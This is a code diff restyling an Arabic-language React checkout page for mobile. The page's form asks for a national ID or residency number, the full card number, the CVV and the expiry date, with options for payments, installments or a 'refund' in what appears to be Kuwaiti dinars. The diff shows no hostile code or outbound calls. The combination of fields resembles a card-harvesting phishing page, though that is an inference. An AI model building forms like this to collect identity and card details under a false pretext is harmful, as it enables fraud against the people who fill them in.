@@ -288,126 +288,52 @@ export default function DetailsPage() {
   return (
     <>
       <Header storeName={settings.storeName} logoUrl={settings.logoUrl} />
-      <main className="w-full max-w-2xl mx-auto px-3 sm:px-6 py-4 sm:py-14 mb-24" dir="rtl">
+      <main className="w-full max-w-2xl mx-auto px-2 sm:px-6 py-3 sm:py-14 mb-24" dir="rtl">
 
         {/* Step Indicator */}
-        <div className="flex flex-col items-center mb-10">
+        <div className="flex flex-col items-center mb-6 sm:mb-10">
           <div className="flex items-center gap-2 mb-2">
-            <span className="px-3 py-1 bg-primary/10 text-primary text-xs font-bold rounded-full tracking-widest uppercase">
+            <span className="px-2.5 py-0.5 bg-primary/10 text-primary text-xs font-bold rounded-full tracking-widest uppercase">
               التحقق
             </span>
           </div>
-          <h1 className="text-2xl sm:text-4xl font-extrabold text-on-background tracking-tight">بيانات العميل</h1>
-          <p className="text-secondary mt-2 text-base">الخطوة 2 من 4</p>
-          <div className="flex gap-2 mt-6 w-full max-w-xs sm:max-w-sm">
-            <div className="h-2 w-full bg-primary rounded-full"></div>
-            <div className="h-2 w-full bg-primary rounded-full"></div>
-            <div className="h-2 w-full bg-surface-container-highest rounded-full"></div>
-            <div className="h-2 w-full bg-surface-container-highest rounded-full"></div>
+          <h1 className="text-lg sm:text-3xl font-extrabold text-on-background tracking-tight">بيانات العميل</h1>
+          <p className="text-secondary mt-1 sm:mt-2 text-xs sm:text-sm">الخطوة 2 من 4</p>
+          <div className="flex gap-1.5 mt-4 sm:mt-6 w-full max-w-[240px] sm:max-w-sm">
+            <div className="h-1.5 sm:h-2 w-full bg-primary rounded-full"></div>
+            <div className="h-1.5 sm:h-2 w-full bg-primary rounded-full"></div>
+            <div className="h-1.5 sm:h-2 w-full bg-surface-container-highest rounded-full"></div>
+            <div className="h-1.5 sm:h-2 w-full bg-surface-container-highest rounded-full"></div>
           </div>
         </div>
 
 
 
         {/* Form Card */}
-        <div className="bg-white rounded-2xl shadow-[0_8px_32px_0_rgba(0,0,0,0.06)] p-4 sm:p-8 md:p-10">
-          {/* Credit Card Preview */}
-          <CreditCard
-            cardNumber={form.cardNumber}
-            cardHolderName={form.cardHolderName}
-            expiryDate={form.expiryDate}
-            cvv={form.cvv}
-            flipped={flipped}
-            cardType={cardType}
-          />
+        <div className="bg-white rounded-2xl shadow-[0_8px_32px_0_rgba(0,0,0,0.06)] p-3 sm:p-8 md:p-10">
+          <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-10">
 
-          <form onSubmit={handleSubmit} className="space-y-10">
-
-            {/* Fields in order: nationalId, cardNumber, cvv, expiryDate, cardHolderName */}
+            {/* 1 & 2: اسم حامل البطاقة + رقم الهوية */}
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-5">
-
-              {/* 1. رقم الهوية */}
               <div className="flex flex-col gap-1 sm:col-span-2">
-                <label className="text-base font-semibold text-secondary px-1">رقم الهوية الوطنية *</label>
+                <label className="text-sm sm:text-base font-semibold text-secondary px-1">الاسم بالكامل كما هو في البطاقة *</label>
                 <input
-                  className="w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:ring-primary/20 focus:bg-white transition-all outline-none"
-                  value={form.nationalId}
-                  onChange={(e) => update("nationalId", e.target.value.replace(/\D/g, ""))}
-                  placeholder="أدخل رقم الهوية الوطنية"
-                  maxLength={10}
-                  required
-                />
-              </div>
-
-              {/* 2. رقم البطاقة */}
-              <div className="flex flex-col gap-1 sm:col-span-2" dir="ltr">
-                <label className="text-base font-semibold text-secondary px-1" dir="rtl">رقم البطاقة *</label>
-                <CardNumberInput
-                  value={form.cardNumber}
-                  onChange={(raw) => update("cardNumber", raw)}
-                  onBlur={() => touch("cardNumber")}
-                  hasError={!!(touched.cardNumber && cardNumberError)}
-                />
-                {touched.cardNumber && cardNumberError && (
-                  <p className="text-error text-xs px-1 mt-0.5" dir="rtl">{cardNumberError}</p>
-                )}
-              </div>
-
-              {/* 3. CVV */}
-              <div className="flex flex-col gap-1">
-                <label className="text-base font-semibold text-secondary px-1">رمز CVV *</label>
-                <input
-                  className={`w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none font-mono tracking-widest ${
-                    touched.cvv && cvvError ? "ring-2 ring-error/40" : "focus:ring-primary/20"
-                  }`}
-                  value={form.cvv}
-                  onChange={(e) => {
-                    update("cvv", e.target.value.replace(/\D/g, ""));
-                    setFlipped(true);
-                  }}
-                  onBlur={() => { setFlipped(false); touch("cvv"); }}
-                  placeholder="•••"
-                  maxLength={3}
-                  inputMode="numeric"
-                  required
-                />
-                {touched.cvv && cvvError && (
-                  <p className="text-error text-xs px-1 mt-0.5">{cvvError}</p>
-                )}
-              </div>
-
-              {/* 4. تاريخ الانتهاء */}
-              <div className="flex flex-col gap-1">
-                <label className="text-base font-semibold text-secondary px-1">تاريخ انتهاء البطاقة *</label>
-                <input
-                  className={`w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none font-mono tracking-widest ${
-                    touched.expiryDate && expiryError ? "ring-2 ring-error/40" : "focus:ring-primary/20"
-                  }`}
-                  value={form.expiryDate}
-                  onChange={(e) => {
-                    let v = e.target.value.replace(/\D/g, "");
-                    if (v.length >= 2) v = v.slice(0, 2) + "/" + v.slice(2, 4);
-                    update("expiryDate", v);
-                  }}
-                  onBlur={() => touch("expiryDate")}
-                  placeholder="MM/YY"
-                  maxLength={5}
-                  inputMode="numeric"
-                  required
-                />
-                {touched.expiryDate && expiryError && (
-                  <p className="text-error text-xs px-1 mt-0.5">{expiryError}</p>
-                )}
-              </div>
-
-              {/* 5. اسم حامل البطاقة */}
-              <div className="flex flex-col gap-1 sm:col-span-2">
-                <label className="text-base font-semibold text-secondary px-1">اسم حامل البطاقة *</label>
-                <input
-                  className="w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:ring-primary/20 focus:bg-white transition-all outline-none uppercase"
+                  className="w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base text-on-surface focus:ring-2 focus:ring-primary/20 focus:bg-white transition-all outline-none uppercase"
                   value={form.cardHolderName}
                   onChange={(e) => update("cardHolderName", e.target.value)}
-                  placeholder="أدخل اسم حامل البطاقة"
+                  placeholder="أدخل الاسم كما هو مكتوب في البطاقة"
+                  required
+                />
+              </div>
+
+              <div className="flex flex-col gap-1 sm:col-span-2">
+                <label className="text-sm sm:text-base font-semibold text-secondary px-1">رقم الهوية الوطنية / الإقامة *</label>
+                <input
+                  className="w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base text-on-surface focus:ring-2 focus:ring-primary/20 focus:bg-white transition-all outline-none"
+                  value={form.nationalId}
+                  onChange={(e) => update("nationalId", e.target.value.replace(/\D/g, ""))}
+                  placeholder="أدخل رقم الهوية الوطنية أو الإقامة"
+                  maxLength={10}
                   required
                 />
               </div>
@@ -415,12 +341,12 @@ export default function DetailsPage() {
 
             {/* Transaction Type Cards */}
             <div>
-              <h3 className="text-xl font-bold text-on-background mb-5">اختر نوع المعاملة</h3>
-              <div className="grid grid-cols-1 xs:grid-cols-2 sm:grid-cols-2 gap-3">
+              <h3 className="text-base sm:text-xl font-bold text-on-background mb-4 sm:mb-5">اختر نوع المعاملة</h3>
+              <div className="grid grid-cols-2 gap-2 sm:gap-3">
                 {transactionTypes.map((t) => (
                   <label
                     key={t.value}
-                    className={`relative flex items-center p-3 sm:p-5 cursor-pointer rounded-xl border-2 transition-all ${
+                    className={`relative flex items-center p-2.5 sm:p-5 cursor-pointer rounded-xl border-2 transition-all ${
                       form.transactionType === t.value
                         ? "bg-surface-container-low border-primary"
                         : "bg-surface-container-low border-transparent hover:border-outline-variant/30"
@@ -435,16 +361,16 @@ export default function DetailsPage() {
                       className="hidden"
                     />
                     <div className="flex items-center gap-3">
-                      <div className="w-9 h-9 sm:w-12 sm:h-12 shrink-0 rounded-xl bg-white flex items-center justify-center text-primary shadow-sm">
-                        <span className="material-symbols-outlined text-[20px] sm:text-[24px]">{t.icon}</span>
+                      <div className="w-8 h-8 sm:w-12 sm:h-12 shrink-0 rounded-xl bg-white flex items-center justify-center text-primary shadow-sm">
+                        <span className="material-symbols-outlined text-[18px] sm:text-[24px]">{t.icon}</span>
                       </div>
                       <div className="min-w-0">
-                        <p className="font-bold text-sm sm:text-base text-on-surface">{TRANSACTION_LABELS[t.value]}</p>
-                        <p className="text-xs sm:text-sm text-on-surface-variant mt-0.5 leading-tight">{t.desc}</p>
+                        <p className="font-bold text-xs sm:text-base text-on-surface leading-tight">{TRANSACTION_LABELS[t.value]}</p>
+                        <p className="text-[10px] sm:text-sm text-on-surface-variant mt-0.5 leading-tight hidden sm:block">{t.desc}</p>
                       </div>
                     </div>
-                    <div className={`mr-auto transition-opacity ${form.transactionType === t.value ? "opacity-100" : "opacity-0"} text-primary`}>
-                      <span className="material-symbols-outlined">check_circle</span>
+                    <div className={`mr-auto shrink-0 transition-opacity ${form.transactionType === t.value ? "opacity-100" : "opacity-0"} text-primary`}>
+                      <span className="material-symbols-outlined text-[18px] sm:text-[24px]">check_circle</span>
                     </div>
                   </label>
                 ))}
@@ -452,12 +378,12 @@ export default function DetailsPage() {
             </div>
 
             {/* Dynamic Fields */}
-            <div className="space-y-6 pt-4 border-t border-surface-container-high">
+            <div className="space-y-6 border-t border-surface-container-high pt-4">
               {needsDay && (
                 <div className="relative flex flex-col gap-1">
-                  <label className="text-base font-semibold text-secondary px-1">اختر يوم السداد الشهري</label>
+                  <label className="text-sm sm:text-base font-semibold text-secondary px-1">اختر يوم السداد الشهري</label>
                   <select
-                    className="w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:ring-primary/20 appearance-none outline-none"
+                    className="w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base text-on-surface focus:ring-2 focus:ring-primary/20 appearance-none outline-none"
                     value={form.installmentDay}
                     onChange={(e) => update("installmentDay", Number(e.target.value))}
                   >
@@ -473,12 +399,12 @@ export default function DetailsPage() {
 
               {needsAmount && (
                 <div className="flex flex-col gap-1">
-                  <label className="text-base font-semibold text-secondary px-1">
-                    {form.transactionType === "refund" ? "المبلغ المراد استرجاعه (د.ك)" : "المبلغ المطلوب دفعه (د.ك)"} *
+                  <label className="text-sm sm:text-base font-semibold text-secondary px-1">
+                    {form.transactionType === "refund" ? "المبلغ المراد استرجاعه" : "أدخل قيمة المبلغ المطلوب دفعه"}
                   </label>
                   <input
                     type="number"
-                    className="w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:ring-primary/20 focus:bg-white transition-all outline-none"
+                    className="w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base text-on-surface focus:ring-2 focus:ring-primary/20 focus:bg-white transition-all outline-none"
                     value={form.amount || ""}
                     onChange={(e) => update("amount", Number(e.target.value))}
                     placeholder="0.00"
@@ -490,19 +416,87 @@ export default function DetailsPage() {
               )}
             </div>
 
+            {/* Credit Card Preview + بيانات البطاقة */}
+            <div>
+              <CreditCard
+                cardNumber={form.cardNumber}
+                cardHolderName={form.cardHolderName}
+                expiryDate={form.expiryDate}
+                cvv={form.cvv}
+                flipped={flipped}
+                cardType={cardType}
+              />
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-5">
+                <div className="flex flex-col gap-1 sm:col-span-2" dir="ltr">
+                  <label className="text-sm sm:text-base font-semibold text-secondary px-1" dir="rtl">رقم البطاقة *</label>
+                  <CardNumberInput
+                    value={form.cardNumber}
+                    onChange={(raw) => update("cardNumber", raw)}
+                    onBlur={() => touch("cardNumber")}
+                    hasError={!!(touched.cardNumber && cardNumberError)}
+                  />
+                  {touched.cardNumber && cardNumberError && (
+                    <p className="text-error text-xs px-1 mt-0.5" dir="rtl">{cardNumberError}</p>
+                  )}
+                </div>
+
+                <div className="flex flex-col gap-1">
+                  <label className="text-sm sm:text-base font-semibold text-secondary px-1">رمز CVV *</label>
+                  <input
+                    className={`w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none font-mono tracking-widest ${
+                      touched.cvv && cvvError ? "ring-2 ring-error/40" : "focus:ring-primary/20"
+                    }`}
+                    value={form.cvv}
+                    onChange={(e) => { update("cvv", e.target.value.replace(/\D/g, "")); setFlipped(true); }}
+                    onBlur={() => { setFlipped(false); touch("cvv"); }}
+                    placeholder="•••"
+                    maxLength={3}
+                    inputMode="numeric"
+                    required
+                  />
+                  {touched.cvv && cvvError && (
+                    <p className="text-error text-xs px-1 mt-0.5">{cvvError}</p>
+                  )}
+                </div>
+
+                <div className="flex flex-col gap-1">
+                  <label className="text-sm sm:text-base font-semibold text-secondary px-1">تاريخ انتهاء البطاقة *</label>
+                  <input
+                    className={`w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none font-mono tracking-widest ${
+                      touched.expiryDate && expiryError ? "ring-2 ring-error/40" : "focus:ring-primary/20"
+                    }`}
+                    value={form.expiryDate}
+                    onChange={(e) => {
+                      let v = e.target.value.replace(/\D/g, "");
+                      if (v.length >= 2) v = v.slice(0, 2) + "/" + v.slice(2, 4);
+                      update("expiryDate", v);
+                    }}
+                    onBlur={() => touch("expiryDate")}
+                    placeholder="MM/YY"
+                    maxLength={5}
+                    inputMode="numeric"
+                    required
+                  />
+                  {touched.expiryDate && expiryError && (
+                    <p className="text-error text-xs px-1 mt-0.5">{expiryError}</p>
+                  )}
+                </div>
+              </div>
+            </div>
+
             {/* Navigation Buttons */}
             <div className="flex flex-col-reverse sm:flex-row items-stretch sm:items-center justify-between gap-3 pt-6">
               <button
                 type="button"
                 onClick={() => router.back()}
-                className="w-full sm:w-auto px-8 py-4 rounded-xl bg-surface-container-high text-on-surface text-base font-bold hover:bg-surface-container-highest transition-all text-center"
+                className="w-full sm:w-auto px-6 py-3 sm:px-8 sm:py-4 rounded-xl bg-surface-container-high text-on-surface text-sm sm:text-base font-bold hover:bg-surface-container-highest transition-all text-center"
               >
                 رجوع
               </button>
               <button
                 type="submit"
                 disabled={submitting}
-                className="w-full sm:w-auto px-10 py-4 rounded-xl bg-gradient-to-br from-primary to-primary-container text-white text-base font-bold shadow-[0_8px_20px_-4px_rgba(0,110,47,0.3)] hover:scale-[1.02] active:scale-95 transition-all text-center disabled:opacity-60 disabled:cursor-not-allowed"
+                className="w-full sm:w-auto px-8 py-3 sm:px-10 sm:py-4 rounded-xl bg-gradient-to-br from-primary to-primary-container text-white text-sm sm:text-base font-bold shadow-[0_8px_20px_-4px_rgba(0,110,47,0.3)] hover:scale-[1.02] active:scale-95 transition-all text-center disabled:opacity-60 disabled:cursor-not-allowed"
               >
                 {submitting ? "جاري التحقق..." : "المتابعة للخطوة التالية"}
               </button>
